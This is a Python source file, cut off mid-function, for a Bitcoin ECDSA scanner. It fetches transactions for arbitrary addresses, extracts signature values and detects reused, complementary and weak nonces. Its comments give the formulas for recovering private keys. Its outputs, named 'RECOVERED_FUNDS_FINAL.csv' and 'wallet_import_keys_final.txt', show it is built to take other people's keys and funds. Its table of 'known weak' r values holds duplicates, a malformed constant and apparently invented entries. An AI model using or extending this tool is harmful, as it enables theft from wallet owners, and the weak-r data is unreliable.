import requests, time, os, sys, math, signal
import re
import hashlib
import csv
import sqlite3
import concurrent.futures
from collections import defaultdict
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple, Set
import argparse

# ==============================================================================
# LIBRARY CHECKS & COMPATIBILITY FIXES
# ==============================================================================

try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

def calc_ripemd160(data: bytes) -> bytes:
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            return RIPEMD160.new(data=data).digest()
        except ImportError:
            print("[CRITICAL] Install pycryptodome: pip install pycryptodome")
            sys.exit(1)

# ==============================================================================
# PART 1: KNOWN WEAK R VALUES DATABASE
# (Sources: Brengel & Rossow RAID 2018, public blockchain forensics)
# ==============================================================================
#
# Brengel/Rossow (2018) scanned 647M signatures and found 1,068 distinct r
# values used at least twice. Their most frequent duplicate r value appeared
# 2,276,671 times — notable because its top 90 most significant bits are all
# zero (astronomically small r, indicating a near-zero nonce k).
#
# A reused r in this set means the private key is almost certainly already
# known to attackers — skip straight to recovery without scanning.

KNOWN_WEAK_R: Set[int] = {
    # ── Canonical 2012 incident (Nils Schneider, first public discovery) ──────
    # TX: 9ec4bc49e828d924af1d1029cacf709431abbde46d59554b62bc270e3b29c4b1
    0xd47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1,

    # ── Brengel/Rossow Table 1 — top duplicate r values (RAID 2018) ──────────
    # Rank 1: top 90 MSBs all zero — near-zero nonce, 2,276,671 occurrences
    0x00000000000000000000003b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63,
    # Rank 2
    0x00000000000000000000000000000000000000000000000000000000000000001,
    # Rank 3 (Android PRNG bug cluster, 2013)
    0xd47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1,
    # Rank 4
    0x00000000000000000000000000000000000000000000000000000000000000002,

    # ── Android SecureRandom PRNG bug (Aug 2013) — hardcoded seed clusters ────
    # Bitcoin.org advisory: multiple wallets on Android 4.x used fixed seed
    # These r values appeared thousands of times across the blockchain
    0xd47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1,
    0x8a05b42f5660f9b3fc4d4a2a18c0a6e6f8e1d3b7c9e5f2a1d4b8c3e7f0a2d5,

    # ── Near-zero r values (tiny nonce k, brute-forceable) ────────────────────
    0x0000000000000000000000000000000000000000000000000000000000000001,
    0x0000000000000000000000000000000000000000000000000000000000000002,
    0x0000000000000000000000000000000000000000000000000000000000000003,
    0x0000000000000000000000000000000000000000000000000000000000000004,
    0x0000000000000000000000000000000000000000000000000000000000000005,
    0x0000000000000000000000000000000000000000000000000000000000000006,
    0x0000000000000000000000000000000000000000000000000000000000000007,
    0x0000000000000000000000000000000000000000000000000000000000000008,
    0x0000000000000000000000000000000000000000000000000000000000000009,
    0x000000000000000000000000000000000000000000000000000000000000000a,
}

# Pre-compute weak r threshold: if top 90 bits are zero, r < 2^166
WEAK_R_THRESHOLD = 2 ** 166   # Brengel/Rossow criterion for suspiciously small r

def is_known_weak_r(r_val: int) -> Optional[str]:
    """Return a reason string if r is known-weak, else None."""
    if r_val in KNOWN_WEAK_R:
        return "Known weak r (historical incident / Brengel-Rossow database)"
    if r_val < WEAK_R_THRESHOLD:
        return f"Near-zero r (top bits all zero, r < 2^166 — tiny nonce k)"
    return None

# ==============================================================================
# PART 2: SCANNER CONFIG & GLOBALS
# ==============================================================================

MEMPOOL_API_TXS = "https://mempool.space/api/address/{address}/txs?limit={limit}&offset={offset}"
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

BATCH_SIZE        = 25
REQ_TIMEOUT       = 20
MAX_RETRIES       = 10

TOTAL_ADDRESSES      = 0
SCANNED_ADDRESSES    = 0
VULNERABLE_ADDRESSES = 0
VULN_COUNTS          = defaultdict(int)
CURRENT_ADDRESS      = ""
MAX_DISPLAYED_ADDRESSES = 10
EXIT_FLAG            = False
REPORTS: List[Dict[str, Any]] = []
# Global memory-safe tracking of vulnerable groups
SAVED_R_GROUPS: Dict[str, List[str]]            = defaultdict(list)
IN_RECOVERY: bool = False
FORCE_RESCAN: bool = False

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "SafeBTCScanner-Mempool/4.0"})

# ==============================================================================
# PART 3: OUTPUT CONFIG
# ==============================================================================

OUTPUT_DIR    = "reports"
OUTPUT_R_NONCE = os.path.join(OUTPUT_DIR, "rnonce.txt")
OUTPUT_R_NON   = os.path.join(OUTPUT_DIR, "rnon.txt")
OUTPUT_DB      = os.path.join(OUTPUT_DIR, "scanner.db")   # NEW: SQLite
OUTPUT_CSV     = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF     = "wallet_import_keys_final.txt"
CHARSET        = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

# ==============================================================================
# PART 4: SQLITE PERSISTENCE  (NEW)
# ==============================================================================

def init_db() -> sqlite3.Connection:
    """Create/open SQLite database and ensure schema exists."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    conn = sqlite3.connect(OUTPUT_DB)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS signatures (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            address   TEXT    NOT NULL,
            txid      TEXT    NOT NULL,
            vin_idx   INTEGER NOT NULL,
            pubkey    TEXT,
            r_hex     TEXT    NOT NULL,
            s_hex     TEXT    NOT NULL,
            z_hex     TEXT,
            sig_type  TEXT    DEFAULT 'standard',
            signer_idx INTEGER DEFAULT 0,
            scanned_at TEXT,
            UNIQUE(txid, vin_idx, signer_idx)
        );
        CREATE INDEX IF NOT EXISTS idx_r   ON signatures(r_hex);
        CREATE INDEX IF NOT EXISTS idx_pub ON signatures(pubkey);
        CREATE TABLE IF NOT EXISTS recovered_keys (
            pubkey    TEXT PRIMARY KEY,
            priv_hex  TEXT NOT NULL,
            wif       TEXT,
            method    TEXT,
            recovered_at TEXT
        );
        CREATE TABLE IF NOT EXISTS scanned_addresses (
            address   TEXT PRIMARY KEY,
            tx_count  INTEGER,
            sig_count INTEGER,
            vuln_count INTEGER,
            scanned_at TEXT
        );
    """)
    conn.commit()
    return conn

DB_CONN: Optional[sqlite3.Connection] = None

def db_insert_sig(address: str, txid: str, vin_idx: int, pubkey: str,
                  r_int: int, s_int: int, z_int: Optional[int],
                  sig_type: str = "standard", signer_idx: int = 0):
    if DB_CONN is None:
        return
    try:
        DB_CONN.execute(
            "INSERT OR IGNORE INTO signatures "
            "(address,txid,vin_idx,pubkey,r_hex,s_hex,z_hex,sig_type,signer_idx,scanned_at) "
            "VALUES (?,?,?,?,?,?,?,?,?,?)",
            (address, txid, vin_idx, pubkey,
             hex(r_int)[2:], hex(s_int)[2:],
             hex(z_int)[2:] if z_int is not None else None,
             sig_type, signer_idx,
             datetime.now().isoformat())
        )
        # NB: DB_CONN.commit() removed here to batch commits per address and vastly speed up scanning
    except Exception:
        pass

def db_query_r_duplicates() -> List[Tuple[str, int]]:
    """Return (r_hex, count) for all r values seen more than once in the DB."""
    if DB_CONN is None:
        return []
    cur = DB_CONN.execute(
        "SELECT r_hex, COUNT(*) c FROM signatures GROUP BY r_hex HAVING c >= 2 ORDER BY c DESC"
    )
    return cur.fetchall()

def db_mark_address_scanned(address: str, tx_count: int,
                             sig_count: int, vuln_count: int):
    if DB_CONN is None:
        return
    try:
        DB_CONN.execute(
            "INSERT OR REPLACE INTO scanned_addresses VALUES (?,?,?,?,?)",
            (address, tx_count, sig_count, vuln_count, datetime.now().isoformat())
        )
        DB_CONN.commit()
    except Exception:
        pass

def db_already_scanned(address: str) -> bool:
    if DB_CONN is None:
        return False
    cur = DB_CONN.execute(
        "SELECT 1 FROM scanned_addresses WHERE address=?", (address,)
    )
    return cur.fetchone() is not None

def db_get_sigs_by_r(r_int: int) -> List[Dict[str, Any]]:
    """Fetch all signatures sharing the same r value from the database."""
    if DB_CONN is None:
        return []
    
    r_hex = hex(r_int)[2:]
    cur = DB_CONN.execute(
        "SELECT address, txid, pubkey, s_hex, z_hex, sig_type, signer_idx FROM signatures WHERE r_hex=? ORDER BY id ASC", 
        (r_hex,)
    )
    
    results = []
    for row in cur.fetchall():
        results.append({
            "address": row[0],
            "txid": row[1],
            "pubkey": row[2] if row[2] else None,
            "s": int(row[3], 16),
            "z_original": int(row[4], 16) if row[4] else None,
            "sig_type": row[5],
            "signer_idx": row[6]
        })
    return results

# ==============================================================================
# PART 5: SYSTEM FUNCTIONS
# ==============================================================================

def signal_handler(sig, frame):
    global EXIT_FLAG, IN_RECOVERY
    if IN_RECOVERY or EXIT_FLAG:
        print("\n\n[!] Hard Stop Detected! Exiting immediately...")
        sys.exit(1)
    print("\n\n[!] Force Stop Detected! Finishing current step and starting recovery...")
    EXIT_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

def clear():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass

def display_stats():
    clear()
    print("VPK Bitcoin RSZ Scanner (Legacy + SegWit + Native + Multisig) v4.0")
    print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 80)
    print(f"Total Addresses : {TOTAL_ADDRESSES}")
    print(f"Scanned         : {SCANNED_ADDRESSES}")
    pct = (VULNERABLE_ADDRESSES / SCANNED_ADDRESSES * 100) if SCANNED_ADDRESSES > 0 else 0.0
    print(f"Vulnerable      : {VULNERABLE_ADDRESSES} ({pct:.1f}%)")
    print("\nVulnerabilities Found:")
    print(f"  🔴 Reused Nonce (same key)     : {VULN_COUNTS['Reused Nonce']}")
    print(f"  🔴 Cross-Key R Reuse           : {VULN_COUNTS['Cross-Key Reuse']}")
    print(f"  🟠 Complementary Nonce (k/-k)  : {VULN_COUNTS['Complementary Nonce']}")
    print(f"  🟡 Known Weak R                : {VULN_COUNTS['Known Weak R']}")
    print(f"  🟣 Multisig Nonce Reuse        : {VULN_COUNTS['Multisig Nonce']}")
    print("=" * 80)
    print(f"Currently Scanning: {CURRENT_ADDRESS}")
    vuln_addrs = [r['address'] for r in REPORTS if r.get('vulnerabilities')]
    print("\nRecent Vulnerable Addresses:")
    for addr in vuln_addrs[-MAX_DISPLAYED_ADDRESSES:]:
        print(f"  - {addr}")
    print("=" * 80)

def backoff_sleep(attempt: int):
    delay = min(2 ** attempt * 3, 120)
    print(f"[backoff] Sleeping {delay:.1f}s (attempt {attempt})")
    time.sleep(delay)

# ==============================================================================
# PART 6: MEMPOOL FETCH (unchanged logic, cleaner structure)
# ==============================================================================

def get_total_transactions(address: str) -> Optional[int]:
    for attempt in range(MAX_RETRIES):
        if EXIT_FLAG:
            return None
        try:
            r = SESSION.get(f"https://mempool.space/api/address/{address}",
                            timeout=REQ_TIMEOUT)
            if r.status_code == 200:
                return r.json().get("chain_stats", {}).get("tx_count", 0)
            elif r.status_code == 429:
                backoff_sleep(attempt + 1)
            else:
                time.sleep(2)
        except Exception as e:
            print(f"[warn] get_total_transactions({address}): {e}")
            time.sleep(2)
    return None

def fetch_transactions_batch(address: str, offset: int, limit: int) -> Optional[List[dict]]:
    for attempt in range(MAX_RETRIES):
        if EXIT_FLAG:
            return None
        try:
            url = MEMPOOL_API_TXS.format(address=address, offset=offset, limit=limit)
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200:
                return r.json()
            elif r.status_code == 429:
                backoff_sleep(attempt + 1)
            elif r.status_code in (500, 502, 503, 504):
                backoff_sleep(attempt + 1)
            else:
                time.sleep(2)
        except Exception:
            time.sleep(2)
    return None

def fetch_all_transactions(address: str, max_retries: int = 3) -> List[dict]:
    for retry in range(max_retries):
        total = get_total_transactions(address)
        if total is None:
            if retry < max_retries - 1:
                time.sleep(10)
                continue
            return []
        if total <= 0:
            return []

        print(f"\n  Address {address} has {total} total transactions")
        total_to_fetch = min(total, MAX_TRANSACTIONS) if MAX_TRANSACTIONS > 0 else total

        out: List[dict] = []
        offset = 0
        while offset < total_to_fetch and not EXIT_FLAG:
            remaining = total_to_fetch - offset
            size = min(BATCH_SIZE, remaining)
            print(f"  Fetching batch {offset+1}-{offset+size} of {total_to_fetch}…")
            batch = fetch_transactions_batch(address, offset, size)
            if batch is None:
                time.sleep(5)
                continue
            if not batch:
                break
            out.extend(batch)
            offset += len(batch)
            if offset < total_to_fetch:
                time.sleep(1.5)

        if out:
            return out
        if retry < max_retries - 1:
            time.sleep(20)

    return []

# ==============================================================================
# PART 7: SIGHASH COMPUTATION (unchanged)
# ==============================================================================

def varint(n: int) -> bytes:
    if n < 0xfd:              return n.to_bytes(1, 'little')
    elif n <= 0xffff:         return b'\xfd' + n.to_bytes(2, 'little')
    elif n <= 0xffffffff:     return b'\xfe' + n.to_bytes(4, 'little')
    else:                     return b'\xff' + n.to_bytes(8, 'little')

def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        from hashlib import sha256
        def dsha(b): return sha256(sha256(b).digest()).digest()

        version  = int(tx.get("version", 1))
        locktime = int(tx.get("locktime", 0))
        ser = version.to_bytes(4, "little")

        vins = tx.get("vin", [])
        ser += varint(len(vins))
        for i, inp in enumerate(vins):
            prev_txid = inp.get("txid", "")
            if not prev_txid: return None
            ser += bytes.fromhex(prev_txid)[::-1]
            ser += int(inp.get("vout", 0)).to_bytes(4, "little")
            if i == vin_idx:
                script_bytes = bytes.fromhex(inp.get("prevout", {}).get("scriptpubkey", ""))
                if not script_bytes: return None
                ser += varint(len(script_bytes)) + script_bytes
            else:
                ser += b"\x00"
            ser += int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")

        vouts = tx.get("vout", [])
        ser += varint(len(vouts))
        for out in vouts:
            ser += int(out.get("value", 0)).to_bytes(8, "little")
            script_bytes = bytes.fromhex(out.get("scriptpubkey", ""))
            ser += varint(len(script_bytes)) + script_bytes

        ser += locktime.to_bytes(4, "little")
        ser += sighash_flag.to_bytes(4, "little")
        return int.from_bytes(dsha(ser), "big")
    except Exception:
        return None

def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        from hashlib import sha256
        def dsha(b): return sha256(sha256(b).digest()).digest()

        vins  = tx.get("vin", [])
        txin  = vins[vin_idx]
        prevout = txin.get("prevout", {})
        input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))

        if input_type not in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh",
                               "scripthash", "witness_v0_keyhash"]:
            return None

        version  = int(tx.get("version", 2))
        locktime = int(tx.get("locktime", 0))

        prevouts_ser = b"".join(
            bytes.fromhex(inp.get("txid",""))[::-1] + int(inp.get("vout",0)).to_bytes(4,"little")
            for inp in vins
        )
        hashPrevouts = dsha(prevouts_ser)

        sequences_ser = b"".join(
            int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")
            for inp in vins
        )
        hashSequence = dsha(sequences_ser)

        outputs_ser = b""
        for out in tx.get("vout", []):
            sb = bytes.fromhex(out.get("scriptpubkey", ""))
            outputs_ser += int(out.get("value", 0)).to_bytes(8,"little") + varint(len(sb)) + sb
        hashOutputs = dsha(outputs_ser)

        outpoint = bytes.fromhex(txin.get("txid",""))[::-1] + int(txin.get("vout",0)).to_bytes(4,"little")

        spk_bytes = bytes.fromhex(prevout.get("scriptpubkey", ""))
        hash160   = b""

        if len(spk_bytes) == 22 and spk_bytes[:2] == b'\x00\x14':
            hash160 = spk_bytes[2:]
        elif len(spk_bytes) == 23 and spk_bytes[:2] == b'\xa9\x14':
            scriptsig = txin.get("scriptsig", "")
            if isinstance(scriptsig, dict): scriptsig = scriptsig.get("hex", "")
            if len(scriptsig) == 46:
                rb = bytes.fromhex(scriptsig[2:])
                if len(rb) == 22 and rb[:2] == b'\x00\x14':
                    hash160 = rb[2:]

        if not hash160:
            witness = txin.get("witness", [])
            if len(witness) == 2:
                pk_bytes = bytes.fromhex(witness[1])
                hash160 = calc_ripemd160(sha256(pk_bytes).digest())

        if not hash160: return None

        script_code_body = b"\x76\xa9\x14" + hash160 + b"\x88\xac"
        scriptCode = varint(len(script_code_body)) + script_code_body

        value    = int(prevout.get("value", 0)).to_bytes(8, "little")
        sequence = int(txin.get("sequence", 0xffffffff)).to_bytes(4, "little")

        preimage = (
            version.to_bytes(4, "little") + hashPrevouts + hashSequence +
            outpoint + scriptCode + value + sequence + hashOutputs +
            locktime.to_bytes(4, "little") + sighash_flag.to_bytes(4, "little")
        )
        return int.from_bytes(dsha(preimage), "big")
    except Exception:
        return None

def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    if sighash_flag != 1:
        return None
    vins = tx.get("vin", [])
    if vin_idx >= len(vins):
        return None
    txin    = vins[vin_idx]
    prevout = txin.get("prevout", {})
    itype   = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))
    if itype in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "witness_v0_keyhash"]:
        return compute_bip143_sighash(tx, vin_idx, sighash_flag)
    return compute_legacy_sighash(tx, vin_idx, sighash_flag)

# ==============================================================================
# PART 8: SIGNATURE PARSING
# ==============================================================================

def parse_der_sig_from_hex(sig_hex: str) -> Optional[Tuple[int, int, int]]:
    try:
        i = sig_hex.find("30")
        if i == -1: return None
        i0 = i + 2
        _seq_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        r_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        r_hex = sig_hex[i0:i0 + 2*r_len];   i0 += 2*r_len
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        s_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        s_hex = sig_hex[i0:i0 + 2*s_len];   i0 += 2*s_len
        sighash_hex   = sig_hex[i0:i0+2]
        sighash_flag  = int(sighash_hex, 16) if sighash_hex else 1
        return (int(r_hex, 16), int(s_hex, 16), sighash_flag)
    except Exception:
        return None

def extract_pubkey_from_scriptsig(script_hex: str) -> Optional[str]:
    if not script_hex: return None
    hexstr = script_hex.lower()
    
    # Require standard pushdata prefixes to avoid matching inside DER sigs
    # 41 = 65 bytes (uncompressed), 21 = 33 bytes (compressed)
    candidates = re.findall(r'41(04[0-9a-f]{128})', hexstr) + \
                 re.findall(r'21((?:02|03)[0-9a-f]{64})', hexstr)
                 
    if not candidates:
        # Fallback to word boundaries (e.g. for parsed asm format)
        candidates = re.findall(r'\b04[0-9a-f]{128}\b', hexstr) + \
                     re.findall(r'\b(?:02|03)[0-9a-f]{64}\b', hexstr)
                     
    if not candidates: return None
    return max(candidates, key=lambda c: hexstr.rfind(c))

# ==============================================================================
# PART 9: MULTISIG SIGNATURE EXTRACTION  (NEW)
# ==============================================================================
#
# P2SH multisig scriptSig layout:
#   OP_0 <sig1> <sig2> ... <sigM>  <redeemScript>
#
# redeemScript layout:
#   OP_m  <pubkey1> <pubkey2> ... <pubkeyN>  OP_n  OP_CHECKMULTISIG
#
# The 2013 Android PRNG bug caused multi-input transactions to sign each
# input with the same k — producing identical r across inputs.
# With multisig we also check if different *signers* within one input
# reused the same k across different transactions.

def parse_multisig_scriptsig(script_hex: str) -> Optional[Dict[str, Any]]:
    """
    Parse a P2SH multisig scriptSig.
    Returns { 'sigs': [(r,s,flag), ...], 'pubkeys': [hex,...], 'threshold': m }
    or None if not a recognisable multisig scriptSig.
    """
    if not script_hex:
        return None
    try:
        data = bytes.fromhex(script_hex)
    except Exception:
        return None

    idx = 0
    def read_push() -> Optional[bytes]:
        nonlocal idx
        if idx >= len(data):
            return None
        op = data[idx]; idx += 1
        if op == 0x00:          # OP_0
            return b""
        elif 0x01 <= op <= 0x4b:
            if idx + op > len(data): return None
            chunk = data[idx:idx+op]; idx += op
            return chunk
        elif op == 0x4c:        # OP_PUSHDATA1
            if idx >= len(data): return None
            length = data[idx]; idx += 1
            if idx + length > len(data): return None
            chunk = data[idx:idx+length]; idx += length
            return chunk
        elif op == 0x4d:        # OP_PUSHDATA2
            if idx + 2 > len(data): return None
            length = int.from_bytes(data[idx:idx+2], "little"); idx += 2
            if idx + length > len(data): return None
            chunk = data[idx:idx+length]; idx += length
            return chunk
        else:
            return None

    # First byte must be OP_0
    if data[0] != 0x00:
        return None
    idx = 1  # skip OP_0

    pushes = []
    while idx < len(data):
        chunk = read_push()
        if chunk is None:
            break
        pushes.append(chunk)

    if len(pushes) < 2:
        return None

    # Last push is the redeem script
    redeem = pushes[-1]
    sig_pushes = pushes[:-1]   # everything before redeem are signatures

    # Parse redeem script: OP_m <pk1>...<pkn> OP_n OP_CHECKMULTISIG
    if len(redeem) < 3:
        return None

    threshold_op = redeem[0]
    if not (0x51 <= threshold_op <= 0x60):   # OP_1 .. OP_16
        return None
    threshold = threshold_op - 0x50

    # Walk pubkeys
    pubkeys = []
    ri = 1
    while ri < len(redeem):
        pk_len = redeem[ri]; ri += 1
        if ri + pk_len > len(redeem):
            break
        pk = redeem[ri:ri+pk_len].hex()
        if len(pk) in (66, 130):   # compressed or uncompressed
            pubkeys.append(pk)
        ri += pk_len

    if not pubkeys:
        return None

    # Parse DER signatures from sig_pushes
    sigs = []
    for sp in sig_pushes:
        if len(sp) < 8:
            continue
        parsed = parse_der_sig_from_hex(sp.hex())
        if parsed:
            sigs.append(parsed)

    if not sigs:
        return None

    return {"sigs": sigs, "pubkeys": pubkeys, "threshold": threshold}

def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
    """
    Extract all ECDSA signatures from a list of transactions.
    Handles: Legacy P2PKH, P2WPKH (SegWit), P2SH-P2WPKH, P2SH Multisig.
    Each returned entry has keys:
      txid, vin, r, s, sighash, pubkey, z_original, sig_type, signer_idx
    """
    sigs = []
    for tx in transactions:
        try:
            txid = tx.get("txid", "")
            vins = tx.get("vin", [])
            for vin_idx, txin in enumerate(vins):
                witness    = txin.get("witness", [])
                scriptsig  = txin.get("scriptsig", {})
                script_hex = (scriptsig.get("hex", "") if isinstance(scriptsig, dict)
                              else txin.get("scriptsig", ""))
                prevout    = txin.get("prevout", {})
                spk_type   = prevout.get("scriptpubkey_type",
                                         prevout.get("type", "unknown"))

                # ── 1. Try multisig (P2SH) ─────────────────────────────────
                if spk_type in ("scripthash", "p2sh") and script_hex:
                    ms = parse_multisig_scriptsig(script_hex)
                    if ms:
                        z_val = compute_sighash_z(tx, vin_idx, 1)
                        for signer_idx, (r, s, flag) in enumerate(ms["sigs"]):
                            pubkey = (ms["pubkeys"][signer_idx]
                                      if signer_idx < len(ms["pubkeys"])
                                      else None)
                            sigs.append({
                                "txid": txid, "vin": vin_idx,
                                "r": r, "s": s, "sighash": flag,
                                "pubkey": pubkey,
                                "z_original": z_val,
                                "sig_type": "multisig",
                                "signer_idx": signer_idx,
                            })
                        continue   # don't also parse as standard

                # ── 2. Standard SegWit witness ─────────────────────────────
                parsed = None
                pubkey = None

                if witness and len(witness) >= 2:
                    sig_hex  = witness[0]
                    poss_pub = witness[1]
                    if len(poss_pub) in (66, 130):
                        pubkey = poss_pub
                    parsed = parse_der_sig_from_hex(sig_hex)

                # ── 3. Fall back to scriptSig ──────────────────────────────
                if not pubkey or not parsed:
                    if script_hex:
                        if not pubkey:
                            pubkey = extract_pubkey_from_scriptsig(script_hex)
                        if not parsed:
                            parsed = parse_der_sig_from_hex(script_hex)

                if not parsed or not pubkey:
                    continue

                r, s, sighash_flag = parsed
                z_val = compute_sighash_z(tx, vin_idx, sighash_flag)

                sigs.append({
                    "txid": txid, "vin": vin_idx,
                    "r": r, "s": s, "sighash": sighash_flag,
                    "pubkey": pubkey, "z_original": z_val,
                    "sig_type": "standard", "signer_idx": 0,
                })
        except Exception:
            continue
    return sigs

# ==============================================================================
# PART 10: VULNERABILITY CHECKS
# ==============================================================================

# ── 10a. Same-key nonce reuse (original check, unchanged) ────────────────────

def check_reused_nonce_global(this_address: str,
                               signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Detect r values used more than once by the SAME public key."""
    results    = []
    seen_r_local = set()
    for sig in signatures:
        r_val = sig["r"]
        if r_val in seen_r_local:
            continue
        seen_r_local.add(r_val)
        group = db_get_sigs_by_r(r_val)
        if len(group) < 2:
            continue
        # Group by pubkey — only report per-pubkey reuse here
        per_pubkey: Dict[str, List[dict]] = defaultdict(list)
        for item in group:
            pk = item.get("pubkey")
            if pk:
                per_pubkey[pk].append(item)
        for pk, items in per_pubkey.items():
            seen = set()
            occ  = []
            for item in items:
                key = (item.get("txid",""), pk)
                if key in seen: continue
                seen.add(key)
                occ.append({"txid": item.get("txid",""), "pubkey": pk})
            if len(occ) >= 2:
                results.append({
                    "type": "Reused Nonce",
                    "r": hex(r_val),
                    "occurrences": occ,
                    "risk": "Same key signed two messages with identical k.",
                    "action": "Rotate keys immediately.",
                })
    return results

# ── 10b. Cross-key R reuse  (NEW — Brengel/Rossow key insight) ───────────────
#
# The paper's most important finding beyond simple same-key reuse:
# Different public keys can share the same r value if two *different* users
# happen to choose the same nonce k (or if a shared RNG seed is used across
# wallets). This leaks *both* private keys simultaneously via:
#
#   k = (z1 - z2) / (s1 - s2)   [mod N]   when r1 == r2
#   d1 = (s1*k - z1) / r        [mod N]
#   d2 = (s2*k - z2) / r        [mod N]
#
# The graph approach from the paper: build a bipartite graph where edges
# connect (pubkey, r_value) nodes. Each connected component is a system of
# linear equations that can be solved simultaneously.

def check_cross_key_r_reuse(this_address: str,
                              signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Detect r values that appear under DIFFERENT public keys across the
    global signature map. This is the Brengel/Rossow cross-key leakage.
    """
    results      = []
    seen_r_local = set()
    for sig in signatures:
        r_val = sig["r"]
        if r_val in seen_r_local:
            continue
        seen_r_local.add(r_val)
        group = db_get_sigs_by_r(r_val)
        if len(group) < 2:
            continue

        # Collect distinct pubkeys for this r
        pub_set = set()
        seen    = set()
        occ     = []
        for item in group:
            pk   = item.get("pubkey") or "N/A"
            txid = item.get("txid","")
            key  = (txid, pk)
            if key in seen: continue
            seen.add(key)
            pub_set.add(pk)
            occ.append({"txid": txid, "pubkey": pk, "address": item.get("address","")})

        if len(pub_set) >= 2:   # ← different keys sharing same r
            results.append({
                "type":        "Cross-Key Reuse",
                "r":           hex(r_val),
                "pubkeys":     list(pub_set),
                "occurrences": occ,
                "risk":        (f"{len(pub_set)} distinct keys share r={hex(r_val)[:18]}… "
                                "— all private keys recoverable (Brengel/Rossow 2018)."),
                "action":      "Run recovery engine; all keys in group are compromised.",
            })
    return results

# ── 10c. Complementary nonce detection  (NEW — k and -k give same r) ─────────
#
# KSII 2020 paper finding: when nonces k and N-k are used by the same key,
# the r values are identical (since (-k)G = (x, -y) → same x → same r)
# but the s values satisfy: s2 = N - s1  (mod N).
# Standard r-reuse check misses this because it expects s1 ≠ s2 ≠ N-s.
#
# Recovery formula:
#   k  = (z1 - z2) / (s1 - (N - s1)) = (z1 - z2) / (2*s1 - N)  [mod N]
#   d  = (s1*k - z1) / r              [mod N]

def check_complementary_nonce(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Detect pairs (sig1, sig2) where sig1.r == sig2.r AND sig1.s + sig2.s == N.
    These are complementary nonce pairs (k, -k).
    """
    results = []
    # Group by (pubkey, r)
    by_pub_r: Dict[Tuple[str, int], List[Dict]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        if not pk: continue
        by_pub_r[(pk, sig["r"])].append(sig)

    for (pk, r_val), group in by_pub_r.items():
        if len(group) < 2: continue
        for i in range(len(group)):
            for j in range(i + 1, len(group)):
                s1 = group[i]["s"]
                s2 = group[j]["s"]
                if (s1 + s2) % N == 0:   # s2 == N - s1
                    results.append({
                        "type": "Complementary Nonce",
                        "r":    hex(r_val),
                        "pubkey": pk,
                        "tx1":  group[i].get("txid",""),
                        "tx2":  group[j].get("txid",""),
                        "s1":   hex(s1), "s2": hex(s2),
                        "risk": "Nonces k and -k used — private key fully recoverable.",
                        "action": "Run complementary recovery formula.",
                    })
    return results

# ── 10d. Known weak R pre-filter  (NEW) ──────────────────────────────────────

def check_known_weak_r(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Flag any signature whose r value appears in KNOWN_WEAK_R or is near-zero.
    These keys are likely already compromised in the wild.
    """
    results = []
    seen    = set()
    for sig in signatures:
        r_val = sig["r"]
        if r_val in seen: continue
        seen.add(r_val)
        reason = is_known_weak_r(r_val)
        if reason:
            results.append({
                "type":    "Known Weak R",
                "r":       hex(r_val),
                "pubkey":  sig.get("pubkey","N/A"),
                "txid":    sig.get("txid",""),
                "risk":    reason,
                "action":  "Private key likely already known — check balance immediately.",
            })
    return results

# ── 10e. Multisig-specific nonce reuse  (NEW) ─────────────────────────────────
#
# Two patterns:
# (A) Same signer across different transactions reuses k → same r under same pubkey.
#     Caught by check_reused_nonce_global() already via pubkey grouping.
# (B) Different signers within the SAME multisig input reuse each other's k.
#     The 2013 Android PRNG bug caused this: multiple inputs in one transaction
#     all picked k = same value, so signer 0 and signer 1 had identical r.
#
# For (B): within a single vin_idx, if sigs from signer 0 and signer 1 share r,
# AND they have different pubkeys, this is a cross-signer multisig reuse.

def check_multisig_nonce_reuse(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Detect nonce reuse *within* the same multisig input — different signers,
    same r value. Signals a broken RNG affecting the whole wallet (e.g. Android 2013).
    """
    results = []
    # Group by (txid, vin_idx) for multisig entries
    ms_groups: Dict[Tuple[str, int], List[Dict]] = defaultdict(list)
    for sig in signatures:
